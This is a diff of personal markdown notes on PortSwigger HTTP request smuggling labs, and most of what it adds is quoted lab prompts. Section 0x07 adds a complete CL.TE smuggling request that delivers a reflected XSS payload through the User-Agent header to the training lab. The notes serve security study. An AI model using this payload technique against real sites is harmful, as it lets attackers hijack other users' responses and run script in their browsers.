@@ -37,18 +37,19 @@ Labs: https://portswigger.net/web-security/all-labs#http-request-smuggling
 ## 0x01: HTTP request smuggling, confirming a CL.TE vulnerability via differential responses
 
 Prompt:
- This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.
+> This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.
+> 
+> To solve the lab, smuggle a request to the back-end server, so that a subsequent request for / (the web root) triggers a 404 Not Found response.
+> Note
+> 
+> Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.
+> Tip
+> 
+> Manually fixing the length fields in request smuggling attacks can be tricky. Our HTTP Request Smuggler Burp extension was designed to help. You can install it via the BApp Store.
+> 
 
-To solve the lab, smuggle a request to the back-end server, so that a subsequent request for / (the web root) triggers a 404 Not Found response.
-Note
-
-Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.
-Tip
-
-Manually fixing the length fields in request smuggling attacks can be tricky. Our HTTP Request Smuggler Burp extension was designed to help. You can install it via the BApp Store.
 
 asdf
-
 
 
 ## 0x02: HTTP request smuggling, confirming a TE.CL vulnerability via differential responses
@@ -184,7 +185,42 @@ csrf=fSc9fJATebAcjsLUjQsGhrZ0pUFHocrj&postId=5&name=test&email=a%40a.com&website
 
 ## 0x07: Exploiting HTTP request smuggling to deliver reflected XSS
 
+Prompt:
+>  This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.
+> 
+> The application is also vulnerable to reflected XSS via the User-Agent header.
+> 
+> To solve the lab, smuggle a request to the back-end server that causes the next user's request to receive a response containing an XSS exploit that executes alert(1).
+> Notes
+> 
+>     Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.
+>     The lab simulates the activity of a victim user. Every few POST requests that you make to the lab, the victim user will make their own request. You might need to repeat your attack a few times to ensure that the victim user's request occurs as required.
+> 
+> Tip
+> 
+> Manually fixing the length fields in request smuggling attacks can be tricky. Our HTTP Request Smuggler Burp extension was designed to help. You can install it via the BApp Store.
+
+
 asdf
+
+note the lack of `\r\n` on the end
+```
+POST / HTTP/1.1
+Host: 0a4000430333e77180d803f6008600d0.web-security-academy.net
+Content-Length: 209
+Transfer-Encoding: chunked
+
+0
+
+GET /post?postId=8 HTTP/1.1
+Host: 0a4000430333e77180d803f6008600d0.web-security-academy.net
+Cookie: session=fchmjufVn8EIUtDCgjqEOajZ9FGUo2Q0
+User-Agent: PSWAHRSTEST"><script>alert(1)</script><"
+Foo: X
+```
+
+url: https://0a4000430333e77180d803f6008600d0.web-security-academy.net/post?postId=8
+
 
 ## 0x08: Response queue poisoning via H2.TE request smuggling
 
@@ -310,6 +346,20 @@ G
 ```
 
 ## 0x11: Exploiting HTTP request smuggling to perform web cache poisoning
+
+Prompt:
+
+> This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. The front-end server is configured to cache certain responses.
+>
+>To solve the lab, perform a request smuggling attack that causes the cache to be poisoned, such that a subsequent request for a JavaScript file receives a redirection to the exploit server. The poisoned cache should alert document.cookie.
+>Notes
+>
+>    Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.
+>    The lab simulates the activity of a victim user. Every few POST requests that you make to the lab, the victim user will make their own request. You might need to repeat your attack a few times to ensure that the victim user's request occurs as required.
+>
+>Tip
+>
+>Manually fixing the length fields in request smuggling attacks can be tricky. Our HTTP Request Smuggler Burp extension was designed to help. You can install it via the BApp Store.
 
 asdf
 
